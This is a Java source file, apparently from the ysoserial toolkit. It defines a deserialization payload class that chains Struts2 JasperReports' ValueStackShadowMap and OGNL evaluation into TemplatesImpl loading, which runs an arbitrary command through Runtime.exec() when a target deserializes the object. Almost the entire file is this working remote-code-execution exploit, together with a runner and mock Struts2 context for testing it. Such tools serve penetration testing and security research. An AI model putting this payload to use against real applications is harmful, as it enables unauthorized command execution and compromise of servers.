package ysoserial.payloads;

import java.lang.reflect.Constructor;
import java.util.HashMap;

import org.apache.struts2.views.jasperreports.ValueStackShadowMap;

import com.opensymphony.xwork2.ActionContext;
import com.opensymphony.xwork2.TextProvider;
import com.opensymphony.xwork2.config.Configuration;
import com.opensymphony.xwork2.config.ConfigurationManager;
import com.opensymphony.xwork2.config.providers.XWorkConfigurationProvider;
import com.opensymphony.xwork2.conversion.impl.XWorkConverter;
import com.opensymphony.xwork2.inject.Container;
import com.opensymphony.xwork2.ognl.OgnlValueStack;
import com.opensymphony.xwork2.ognl.accessor.CompoundRootAccessor;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

/**
*
* Gadget chain:
* 
* 
* 	java/util/HashMap<K,V>.readObject(ObjectInputStream)
* 	java/util/HashMap<K,V>.putVal(int, K, V, boolean, boolean)
* 		org/apache/struts2/views/jasperreports/ValueStackShadowMap(AbstractMap<K,V>).equals(Object)
* 		org/apache/struts2/views/jasperreports/ValueStackShadowMap.get(String)
* 			com/opensymphony/xwork2/ognl/OgnlValueStack.findValue(String) //keyExpression 
* 
* 			Execution of embedded OGNL invoking template.newTrasformer (object put in the valueStack)
* 
*  				TemplatesImpl.newTransformer()
*					TemplatesImpl.getTransletInstance()
*						TemplatesImpl.defineTransletClasses()
*							TemplatesImpl.TransletClassLoader.defineClass()
*								Pwner*(Javassist-generated).<static init>
*									Runtime.exec()
*
*
* @author sciccone
*
*/
@SuppressWarnings({ "unchecked" })
@PayloadTest(harness="ysoserial.test.payloads.Struts2JasperReportsTest")
@Dependencies( { "org.apache.struts:struts2-core:2.5.20", "org.apache.struts:struts2-jasperreports-plugin:2.5.20" } )
@Authors({ Authors.SCICCONE })
public class Struts2JasperReports implements ObjectPayload<Object>, DynamicDependencies {

	@Override
	public Object getObject(String command) throws Exception {
		
		// create required objects via reflection
		Constructor<XWorkConverter> c1 = XWorkConverter.class.getDeclaredConstructor();
		Constructor<OgnlValueStack> c2 = OgnlValueStack.class.getDeclaredConstructor(
				XWorkConverter.class, CompoundRootAccessor.class, TextProvider.class, boolean.class);
		c1.setAccessible(true);
		c2.setAccessible(true);
		XWorkConverter xworkConverter = c1.newInstance();
		OgnlValueStack ognlValueStack = c2.newInstance(xworkConverter,null,null,true);
		
		// inject templateImpl with embedded command
		ognlValueStack.set("template", Gadgets.createTemplatesImpl(command));
		
		// create shadowMaps
		ValueStackShadowMap shadowMap1 = new ValueStackShadowMap(ognlValueStack);
		ValueStackShadowMap shadowMap2 = new ValueStackShadowMap(ognlValueStack);
		
		// execute OGNL "(template.newTransformer()) upon deserialisation
		String keyExpression = "(template.newTransformer())";
		shadowMap1.put(keyExpression, null);
		shadowMap2.put(keyExpression, null);
		
        return Gadgets.makeMap(shadowMap1, shadowMap2);
	}
	
    
    public static void main ( final String[] args ) throws Exception {
    	initializeThreadLocalMockContainerForTesting();
    	PayloadRunner.run(Struts2JasperReports.class, args);
    }
    
    
    /**
     * Create mock container and mock actionContext,
     * since a context is required for the payload being triggered upon deserialisation.
     * Simulates an Apache Struts2 app up and running.
     */
    public static void initializeThreadLocalMockContainerForTesting() {
        ConfigurationManager configurationManager = new ConfigurationManager(Container.DEFAULT_NAME);
        configurationManager.addContainerProvider(new XWorkConfigurationProvider());
        Configuration config = configurationManager.getConfiguration();
        Container container = config.getContainer();
        
    	HashMap<String, Object> context = new HashMap<String, Object>();
    	context.put(ActionContext.CONTAINER, container);
    	ActionContext.setContext(new ActionContext(context));
    }
    
    // add dependencies for testing a mock struts2 app 
    public static String[] getDependencies () {
        return new String[] {
        	"org.apache.struts:struts2-core:2.5.20", 
        	"org.apache.struts:struts2-jasperreports-plugin:2.5.20",
        	"org.apache.logging.log4j:log4j-api:2.11.1",
        	"ognl:ognl:3.1.21", "org.apache.commons:commons-lang3:3.8.1",
        	"javassist:javassist:3.12.1.GA"
        };

    }
}
